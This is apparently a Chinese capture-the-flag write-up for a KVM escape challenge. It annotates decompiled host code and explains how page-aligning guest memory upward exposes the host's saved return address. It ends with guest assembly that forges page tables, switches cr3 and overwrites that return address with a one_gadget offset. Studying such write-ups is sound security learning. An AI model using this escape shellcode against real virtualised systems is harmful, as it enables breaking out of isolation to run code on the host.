在解析题目之前需要先构建kvm环境

```shell
sudo apt-get install cpu-checker
kvm-ok
#如果此处出现:
#INFO: /dev/kvm exists
#KVM acceleration can be used,则代表允许虚拟化构建
sudo apt-get install -y virt-manager
lsmod | grep kvm
#出现：
#kvm_intel             217088  2
#kvm                   614400  1 kvm_intel
#irqbypass              16384  1 kvm
```

学习前置知识--虚拟机启动过程

```
第一步，获取到kvm句柄
kvmfd = open("/dev/kvm", O_RDWR);
第二步，创建虚拟机，获取到虚拟机句柄。
vmfd = ioctl(kvmfd, KVM_CREATE_VM, 0);
第三步，为虚拟机映射内存，还有其他的PCI，信号处理的初始化。
ioctl(kvmfd, KVM_SET_USER_MEMORY_REGION, &mem);
第四步，将虚拟机镜像映射到内存，相当于物理机的boot过程，把镜像映射到内存。
第五步，创建vCPU，并为vCPU分配内存空间。
ioctl(kvmfd, KVM_CREATE_VCPU, vcpuid);
vcpu->kvm_run_mmap_size = ioctl(kvm->dev_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
第五步，创建vCPU个数的线程并运行虚拟机。
ioctl(kvm->vcpus->vcpu_fd, KVM_RUN, 0);
第六步，线程进入循环，并捕获虚拟机退出原因，做相应的处理。
这里的退出并不一定是虚拟机关机，虚拟机如果遇到IO操作，访问硬件设备，缺页中断等都会退出执行，退出执行可以理解为将CPU执行上下文返回到QEMU。
```

根据以上理论进行kvm文件反汇编

```c
 memset(guest_mem, 0, 0x8000uLL);
 aligned_guest_mem = &guest_mem[4096LL - (((unsigned __int16)&savedregs + 0x7FF0) & 0xFFF)];// 0x1000 - (取s的后三位)，然后页对齐，向上取整
```

根据gdb动调，可以发现，&savedregs + 0x7FF0 其实就是guest_mem的位置

此处可以看到，guest_mem的地址是0x7fffffff5cc0 

![image-20200915221929196](C:\Users\zhz\AppData\Roaming\Typora\typora-user-images\image-20200915221929196.png)

接着再往下看，`lea rax，[rbp - 0x8010]`这句汇编

![image-20200915222121816](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200915222121816.png)

利用计算器，0x7fffffffdcd0 - 0x8010 = 0x7fffffff5cc0，故此就是guest_mem的地址。

根据此来计算，第二行的代码就变为了alignd_guest_mem = &guest_mem + (0x1000 - &guest_mem的后三位)。更简单来说，就是使得alignd_guest_mem变为&guest_mem的页对齐地址，存储的是0x7fffffff5cc0页对齐后的地址，即0x7fffffff6000

接下来就是一次输入，一共四个字节

```c
code_size = -1;
read_n(4, (char *)&code_size);

```

开始创建虚拟机

```c
if ( code_size <= 0x4000 )
  {
    read_n(code_size, aligned_guest_mem);       // 输入code_size大小到aligned_guest_mem
    kvmfd = open("/dev/kvm", 0x80002);          // 构建虚拟机
    if ( kvmfd < 0 )
    {
      v4 = open("/dev/kvm", 0x80002);
      kvmfd = v4;
      err(v4, "fail line: %d", 40LL);
    }
    vmfd = ioctl(kvmfd, 0xAE01uLL, 0LL);        // 创建虚拟机
    if ( vmfd < 0 )
    {
      error_create_kvm = ioctl(kvmfd, 0xAE01uLL, 0LL);
      vmfd = error_create_kvm;
      err(error_create_kvm, "fail line: %d", 43LL);
    }
    region.slot = 0;                            // 整数索引标识
    region.guest_phys_addr = 0;                 // 指定物理地址的基址
    v18 = 0LL;
    region.memory_size = 0x8000LL;              // 指定分配多大的内存
    region.userspace_addr = aligned_guest_mem;  // 指向mmap()分配的后备内存
    // 这里就是对于kvm来说，它本身的物理地址就是[0,0x8000]，但是对于更高一级的主机来说，kvm的物理地址其实是[aligned_guest_mem,aligned_guest_mem + 0x8000]
    if ( ioctl(vmfd, 0x4020AE46uLL, &region.slot) < 0 )// 为虚拟机映射内存，还有其他的PCI，信号处理初始化
    {
      errno_set_user_memory = ioctl(vmfd, 0x4020AE46uLL, &region.slot);
      err(errno_set_user_memory, "fail line: %d", 0x34LL);
    }
    vcpufd = ioctl(vmfd, 0xAE41uLL, 0LL);       // 创建vcpu
     if ( vcpufd < 0 )
    {
      errno_create_vcpu = ioctl(vmfd, 0xAE41uLL, 0LL);
      vcpufd = errno_create_vcpu;
      err(errno_create_vcpu, "fail line: %d", 0x37LL);
    }
    vcpu_mmap_size = ioctl(kvmfd, 0xAE04uLL, 0LL);// 为vCPU分配内存空间，动调出来是0x3000
    run_mem = mmap(0LL, vcpu_mmap_size, 3, 1, vcpufd, 0LL);// mmap(0,0x3000,3,......)
    memset(&v32, 0, 0x90uLL);
    guest_regs._rsp = 0xFF0LL;
    guest_regs.rflags = 2LL;
    if ( ioctl(vcpufd, 0x4090AE82uLL, &v32) < 0 )// 设置寄存器
    {
      errno_set_regs = ioctl(vcpufd, 0x4090AE82uLL, &v32);
      err(errno_set_regs, "fail line: %d", 0x42LL);
    }
    if ( ioctl(vcpufd, 0x8138AE83uLL, &v35) < 0 )// 获取特殊寄存器
    {
      error_get_sregs = ioctl(vcpufd, 0x8138AE83uLL, &v35);
      err(error_get_sregs, "fail line: %d", 0x45LL);
    }
     v20 = 0x7000LL;
    v21 = 0x6000LL;
    v22 = 0x5000LL;
    v23 = 0x4000LL;
    *((_QWORD *)aligned_guest_mem + 0xE00) = 3LL;// 设置四级页表，aligned + 0x7000 = 3
    *(_QWORD *)&aligned_guest_mem[v20 + 8] = 0x1003LL;// aligned + 0x7008 = 0x1003
    *(_QWORD *)&aligned_guest_mem[v20 + 16] = 0x2003LL;// aligned + 0x7010 = 0x2003
    *(_QWORD *)&aligned_guest_mem[v20 + 24] = 0x3003LL;// aligned + 0x7018 = 0x3003
    *(_QWORD *)&aligned_guest_mem[v21] = v20 | 3;// aligned + 0x6000 = 0x7003
    *(_QWORD *)&aligned_guest_mem[v22] = v21 | 3;// aligned + 0x5000 = 0x6003
    *(_QWORD *)&aligned_guest_mem[v23] = v22 | 3;// aligned + 0x4000 = 0x5003
    v25 = 0LL;
    v26 = 0x10B0008FFFFFFFFuLL;
    WORD5(v26) = 257;
    BYTE12(v26) = 1;
    v48 = v23;
    v49 = 0x20LL;
    v47 = 0x80050033LL;
    v50 = 0x500LL;
    v35 = 0LL;
    v36 = v26;
    BYTE6(v26) = 3;
    WORD2(v26) = 0x10;
    v45 = 0LL;
    v46 = v26;
    v43 = 0LL;
    v44 = v26;
    v41 = 0LL;
    v42 = v26;
    v39 = 0LL;
    v40 = v26;
    v37 = 0LL;
    v38 = v26;
    if ( ioctl(vcpufd, 0x4138AE84uLL, &v35) < 0 )
    {
      v10 = ioctl(vcpufd, 0x4138AE84uLL, &v35);
      err(v10, "fail line: %d", 105LL);
    }
    while ( 1 )
    {
      ioctl(vcpufd, 0xAE80uLL, 0LL); // 此处开始运行
```

+ 这里的**漏洞点**在于开头地方，aligned_guest_mem的时候。因为我们可以看到，在初始化栈的时候

```
text:0000000000000933                 sub     rsp, 8280h
```

​	栈的大小只有0x8280，后面跟着ebp，ret。注意，aligned_guest_mem是向上取整的页对齐，原本的  &guest_mem + 0x8000是不包含ebp和ret的，但是现在它向上取整了，变成了aligned_guest_mem +      0x8000，那么就将ebp和ret包含了进去，我们就有机会去修改[0x7000,0x8000]中的ret为我们的onegadget地址。

在这里，先学习一下Linux的四级页表原理：https://blog.csdn.net/qq_38877888/article/details/103261175

简单来说，就是linux中寻找物理地址都是根据四级页表来的

+ 故此因为页机制的存在，我们在kvm中的地址都是针对于kvm来说的虚拟地址，我们是访问不到[0x7000,0x8000]这块地址的。

+ 然后根据以下代码进行分析，可以得到[0,0xfff] [0x1000,0x1fff] [0x2000,0x2fff] [0x3000,0x3fff]四张物理页，0x4000开始为页表项

  ```
   v20 = 0x7000LL;
      v21 = 0x6000LL;
      v22 = 0x5000LL;
      v23 = 0x4000LL;
      *((_QWORD *)aligned_guest_mem + 0xE00) = 3LL;// 设置四级页表，aligned + 0x7000 = 3
      *(_QWORD *)&aligned_guest_mem[v20 + 8] = 0x1003LL;// aligned + 0x7008 = 0x1003
      *(_QWORD *)&aligned_guest_mem[v20 + 16] = 0x2003LL;// aligned + 0x7010 = 0x2003
      *(_QWORD *)&aligned_guest_mem[v20 + 24] = 0x3003LL;// aligned + 0x7018 = 0x3003
      *(_QWORD *)&aligned_guest_mem[v21] = v20 | 3;// aligned + 0x6000 = 0x7003
      *(_QWORD *)&aligned_guest_mem[v22] = v21 | 3;// aligned + 0x5000 = 0x6003
      *(_QWORD *)&aligned_guest_mem[v23] = v22 | 3;// aligned + 0x4000 = 0x5003
      v25 = 0LL;
      v26 = 0x10B0008FFFFFFFFuLL;
      WORD5(v26) = 257;
      BYTE12(v26) = 1;
      v48 = v23;
      v49 = 0x20LL;
      v47 = 0x80050033LL;
      v50 = 0x500LL;
      v35 = 0LL;
      v36 = v26;
      BYTE6(v26) = 3;
      WORD2(v26) = 0x10;
      v45 = 0LL;
      v46 = v26;
      v43 = 0LL;
      v44 = v26;
      v41 = 0LL;
      v42 = v26;
      v39 = 0LL;
      v40 = v26;
      v37 = 0LL;
      v38 = v26;
  ```

+ 但是我们可以直接通过代码在访问到的内存空间里伪造页表项，比如0x0->0x1000->0x2000->0x3000，0x3000->0x7000。接着修改cr3寄存器为0，这样就可以访问[0x7000,0x7fff]的内存

  如图所示，它是一种9，9，9，9，12的结构。你要访问的物理地址转换成二进制，然后对齐48位，前面空余的用0补齐，那么就用寻址物理地址0x7ff0来举例，康康四级页表是如何找到物理地址的

  + 首先根据cr3里的地址找到PGD，也就是图中的p4，因为上面转化二进制而成的48位中开头9位是000000000，所以就在PGD表中索引0的位置找下一个表的地址
+ 此时根据0x4003来到PUD表，也就是p3。同理，因为后续9位也是000000000，所以在表中索引0位置找到下一个表的地址
  + 根据0x6003来到PMD表，也就是p2，后续9位是000000111，所以在表中索引7（表中索引从0开始，所以其实是第8个格子里）找到下一个地址
  + 来到PTE表，也就是p1。
  
  ![image-20200916231428495](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200916231428495.png)
  
  看到这可能就有人有疑惑了，为什么地址后面要跟一个3呢？不是直接0x5000这样寻址吗。是因为最低的12位用于其他信息。对我们来说重要的是第0位和第1位，它们确定我们是否可以访问该页面进行写入（2 ^ 0 + 2 ^ 1 = 3），简单来说，允许读写。
  
  所以我们现在就可以构筑我们的shellcode，进行四级页表的伪造，这里的四级页表伪造成cr3 0x1000->0x2000->0x3000->0x0，然后根据第一个0x8找到我们的物理地址0x7000。最后在[0x7000,0x7fff]中寻找ret，将其改为one_gadget即可
  
  ```
      mov qword ptr [0x1000], 0x2003
      mov qword ptr [0x2000], 0x3003
      mov qword ptr [0x3000], 0x0003
      mov qword ptr [0x0], 0x3 // 个人感觉，这里设置0x3，代表offset就是第一个，也就是在0x8里找最终的物理地址
      mov qword ptr [0x8], 0x7003
      mov rax, 0x1000
      mov cr3, rax
  
      mov rcx, 0x1028
  look_for_ra:
      add rcx, 8
      cmp qword ptr [rcx], 0
      je look_for_ra
  
      add rcx, 24
  overwrite_ra:
      mov rax, qword ptr [rcx]
      add rax, 0x249e6
      mov qword ptr [rcx], rax
      hlt
  ```
  
  